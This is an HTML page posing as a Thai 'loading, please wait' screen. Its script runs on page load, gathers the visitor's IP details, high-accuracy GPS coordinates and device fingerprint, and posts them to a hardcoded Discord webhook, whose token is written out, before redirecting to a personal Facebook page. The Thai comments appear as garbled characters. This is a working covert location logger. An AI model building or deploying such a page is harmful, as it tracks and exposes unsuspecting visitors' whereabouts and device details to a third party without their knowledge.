<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolocation with Accuracy</title>
    <script>
      async function collectData() {
        const data = {
          ip: null,
          geo: null,
          fingerprint: {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: {
              width: screen.width,
              height: screen.height,
              colorDepth: screen.colorDepth
            }
          }
        };

        // IP Lookup (ipapi.co) ‡πÉ‡∏ä‡πâ async/await ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏õ‡∏£‡∏±‡∏ö‡∏õ‡∏£‡∏∏‡∏á‡∏õ‡∏£‡∏∞‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡∏†‡∏≤‡∏û
        try {
          const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
          data.ip = ipData;
        } catch (error) {
          data.ip = { error: "IP lookup failed" };
        }

        // ‡πÉ‡∏ä‡πâ Geolocation API ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á‡∏ó‡∏µ‡πà‡πÅ‡∏°‡πà‡∏ô‡∏¢‡∏≥
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            function(position) {
              data.geo = {
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                accuracy: position.coords.accuracy
              };
              sendToDiscord(data);  // ‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÑ‡∏õ‡∏¢‡∏±‡∏á Discord ‡∏´‡∏•‡∏±‡∏á‡∏à‡∏≤‡∏Å‡πÑ‡∏î‡πâ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•
            },
            function(error) {
              data.geo = {
                error: error.message
              };
              sendToDiscord(data);
            },
            {
              enableHighAccuracy: true,  // ‡πÉ‡∏ä‡πâ‡∏Ñ‡∏ß‡∏≤‡∏°‡πÅ‡∏°‡πà‡∏ô‡∏¢‡∏≥‡∏™‡∏π‡∏á‡∏™‡∏∏‡∏î
              timeout: 5000,             // ‡∏ï‡∏±‡πâ‡∏á‡πÄ‡∏ß‡∏•‡∏≤‡πÄ‡∏õ‡πá‡∏ô 5 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏õ‡∏£‡∏∞‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡∏†‡∏≤‡∏û
              maximumAge: 0              // ‡πÉ‡∏ä‡πâ‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á‡πÉ‡∏´‡∏°‡πà‡πÄ‡∏ó‡πà‡∏≤‡∏ô‡∏±‡πâ‡∏ô
            }
          );
        } else {
          data.geo = { error: "Geolocation not supported" };
          sendToDiscord(data);
        }
      }

      async function sendToDiscord(data) {
        const embed = {
          title: "üì° New Visitor Alert",
          description: "‡∏°‡∏µ‡∏ú‡∏π‡πâ‡πÄ‡∏Ç‡πâ‡∏≤‡∏ä‡∏°‡πÉ‡∏´‡∏°‡πà‡∏û‡∏£‡πâ‡∏≠‡∏°‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏£‡∏∞‡∏ö‡∏ö üëá",
          color: 0x00b0f4,
          fields: [
            {
              name: "üåç IP & Location",
              value: `**IP:** ${data.ip?.ip || 'N/A'}\n**City:** ${data.ip?.city || 'N/A'}, ${data.ip?.country_name || 'N/A'}`
            },
            {
              name: "üõ∞Ô∏è Coordinates",
              value: `**Lat:** ${data.geo?.lat || 'N/A'}\n**Lon:** ${data.geo?.lon || 'N/A'}\n**Accuracy:** ¬±${data.geo?.accuracy || '?'}m`
            },
            {
              name: "üíª Device Info",
              value: `**Platform:** ${data.fingerprint.platform}\n**Timezone:** ${data.fingerprint.timezone}\n**Screen:** ${data.fingerprint.screen.width}x${data.fingerprint.screen.height} (${data.fingerprint.screen.colorDepth} bit)`
            },
            {
              name: "üì± User-Agent",
              value: `\`\`\`${data.fingerprint.userAgent}\`\`\``
            }
          ],
          footer: {
            text: "üéØ Visitor Tracker"
          },
          timestamp: new Date().toISOString()
        };

        // ‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÑ‡∏õ‡∏¢‡∏±‡∏á Discord Webhook
        try {
          await fetch("https://discord.com/api/webhooks/1361764929274646588/EJuR3LqZlhBZfQRXuz7RQQK7lqnEkqrxGQIF_VtnpRbgVU0F9lBLf_AZqiwEDQIlzNYk", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              content: "@everyone üö® **‡∏ú‡∏π‡πâ‡πÄ‡∏Ç‡πâ‡∏≤‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡πÉ‡∏´‡∏°‡πà‡∏ï‡∏£‡∏ß‡∏à‡∏û‡∏ö!**",
              embeds: [embed]
            })
          });
        } catch (error) {
          console.error("Error sending to Discord:", error);
        }

        // Redirect after data collection
        setTimeout(() => {
          window.location.href = "https://www.facebook.com/CEONattakanPinbuaOongfong";  // ‡∏•‡∏¥‡∏á‡∏Å‡πå‡πÑ‡∏õ‡∏¢‡∏±‡∏á Facebook Page ‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏∏‡∏ì
        }, 1500);
      }

      // Run on page load
      window.onload = collectData;
    </script>
</head>
<body>
  <p>‡∏Å‡∏≥‡∏•‡∏±‡∏á‡πÇ‡∏´‡∏•‡∏î... ‡πÇ‡∏õ‡∏£‡∏î‡∏£‡∏≠‡∏™‡∏±‡∏Å‡∏Ñ‡∏£‡∏π‡πà</p>
</body>
</html>
